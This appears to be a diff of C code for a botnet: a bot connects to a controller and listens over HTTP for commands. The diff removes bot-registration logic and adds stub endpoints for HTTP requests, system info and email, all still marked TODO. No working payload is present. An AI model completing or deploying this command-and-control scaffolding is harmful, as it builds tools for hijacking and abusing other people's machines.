@@ -27,21 +27,20 @@ int main(int argc, char const *argv[])
     if (ret < 0)
         handle_error("Could not connect to controller");
 
-    while (1)
+    const union MHD_ConnectionInfo *conninfo;
+
+    mhd_daemon = MHD_start_daemon(MHD_USE_SELECT_INTERNALLY, port, NULL, NULL, &handle_request, NULL, MHD_OPTION_END);
+    if (mhd_daemon == NULL)
     {
-
-        const union MHD_ConnectionInfo *conninfo;
-
-        mhd_daemon = MHD_start_daemon(MHD_USE_SELECT_INTERNALLY, port, NULL, NULL, &handle_request, NULL, MHD_OPTION_END);
-        if (mhd_daemon == NULL)
-        {
-            fprintf(stderr, "Error starting daemon.\n");
-            _exit(EXIT_FAILURE);
-        }
-
-        fprintf(stdout, "Passive mode: listening on port : %ld.\n", port);
+        fprintf(stderr, "Error starting daemon.\n");
+        _exit(EXIT_FAILURE);
     }
 
+    fprintf(stdout, "Passive mode: listening on port : %ld.\n", port);
+
+    while (1)
+    {
+    };
     return 0;
 }
 
@@ -124,32 +123,30 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     response = MHD_create_response_from_buffer(strlen(msg), (void *)msg, MHD_RESPMEM_PERSISTENT);
     ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
 
-    const char *bot_ip = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_IP);
-    const char *bot_port = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_PORT);
-
-    long port = atol(bot_port);
-    struct in_addr address;
-    inet_pton(AF_INET, bot_ip, &(address));
-
-
-    // TODO get updates from bots
-
-    if (findBot(address, port) == -1)
-    {
-
-        ret = registerBot(bot_ip, bot_port);
-
-        if (ret < 0)
-        {
-            const char *msg = "NOT OK";
-        }
-        printf("Bot Connected \n");
+    char *endpoint;
+    endpoint = strstr(url, "/http_req");
+    if(endpoint != NULL){
+        puts("1");
+        // TODO handle http request
+        endpoint = NULL;
     }
 
-    list_botnet(1);
+    endpoint = strstr(url, "/sys_info");
+    if(endpoint != NULL){
+        puts("2");
+        // TODO handle sys_info
+        endpoint = NULL;
+    }
+
+    endpoint = strstr(url, "/email");
+    if(endpoint != NULL){
+        puts("3");
+        endpoint = NULL;
+    }
+
+    // TODO create a method that send a request(response?) to controller in order to notify it that action has been performed, the controller will update the botnet info
+
     MHD_destroy_response(response);
 
     return ret;
-
-    
 }
